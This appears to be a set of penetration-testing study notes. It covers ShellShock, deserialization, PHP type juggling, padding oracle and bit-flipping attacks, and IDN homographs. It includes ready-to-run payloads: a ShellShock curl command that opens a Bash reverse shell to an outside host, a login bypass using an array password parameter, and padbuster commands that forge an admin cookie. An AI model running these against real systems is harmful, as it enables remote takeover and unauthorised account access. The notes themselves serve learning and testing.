# ShellShock Attack
This vulnerability in Bash allows remote code execution without confirmation. A series of random characters, () { :; }; , confuses Bash because it doesn't know what to do with them, so by default, it executes the code after it.

We can manipulate the **User-agent** to execute it, for example:
```console
> curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/myip/443 0>&1" http://example.com/
```

# Deserialization Attacks
**Serialization** is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications.
**Deserialization** is the reverse of that process, taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.

# Type Juggling
With **Type Juggling** during the comparison of variables of different types, PHP will first convert them to a common, comparable type.

For example we can send data like this:
```console
> curl -s -X POST --data 'usuario=admin&password=1' http://[ip] | html2text
```
We will probably get an error, but if we modify the content:
```console
> curl -s -X POST --data 'usuario=admin&password[]=1' http://[ip] | html2text
```
We can log in.

# Padding Oracle Attack

A padding oracle attack is an attack which uses the padding validation of a cryptographic message to decrypt the ciphertext.

## Padbuster
A padding oracle attack is an attack which uses the padding validation of a cryptographic message to decrypt the ciphertext.

We can use **padbuster** to decode a cookie and try to do a cookie hijacking:
```console
$ padbuster [url] 8 -cookie "auth=[cookie]" -encoding 0
```

If it is vulnerable, we can encrypt new cookies. For example if the output is 'user=youruser' we can try:
```console
$ padbuster [url] 8 -cookie "auth=[cookie]" -encoding 0 -plaintext "user=admin"
```

Another way to recretate this if we can register a new user and login, we can create a user like **admin=**. This will create an user with the same privilegies as the user admin.

## Bit Flipper Attack / BurpSuite
Another way is to register a new user like **bdmin**. Send the request to the **Intruder**.
Then we can use the following payload: *type: Bit flipper, Format of original data: Literal value, URL encode: disable*

# IDN homographic attack
The internationalized domain name homograph attack is a way a malicious party may deceive computer users about what remote system they are communicating with, by exploiting the fact that many different characters look alike. For example, a regular user of example.com may be lured to click a link where the Latin character "a" is replaced with the Cyrillic character "а". This kind of spoofing attack is also known as script spoofing.
